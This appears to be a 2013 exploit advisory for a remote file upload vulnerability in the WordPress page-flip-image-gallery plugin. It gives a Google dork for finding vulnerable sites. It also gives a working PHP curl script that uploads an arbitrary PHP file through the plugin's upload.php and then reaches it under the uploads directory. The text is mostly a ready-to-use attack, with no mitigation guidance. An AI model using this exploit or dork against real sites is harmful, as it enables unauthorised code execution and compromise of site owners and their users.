###############################################################
# Exploit Title: Wordpress page-flip-image-gallery plugins Remote File
Upload Vulnerability
# Author: Ashiyane Digital Security Team
# Date: 12/06/2013
# Vendor Homepage: http://pageflipgallery.com
# Software Link :
http://downloads.wordpress.org/plugin/page-flip-image-gallery.zip
# Google dork: inurl:/wp-content/plugins/page-flip-image-gallery/
# Tested on: Windows/Linux
###############################################################

1)Exploit :
= = = = = =

<?php
$uploadfile="file.php";
$ch = curl_init("
http://127.0.0.1/wp-content/plugins/page-flip-image-gallery/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('orange_themes'=>"@$uploadfile")); curl_setopt($ch,
CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch); print "$postResult";
?>

http://[Target]/wp-content/uploads/file.php

# #### #### #### #### #### #### #### #### #
# BY T3rm!nat0r5
# E-mail : poya.terminator@gmail.com
# #### #### #### #### #### #### #### #### #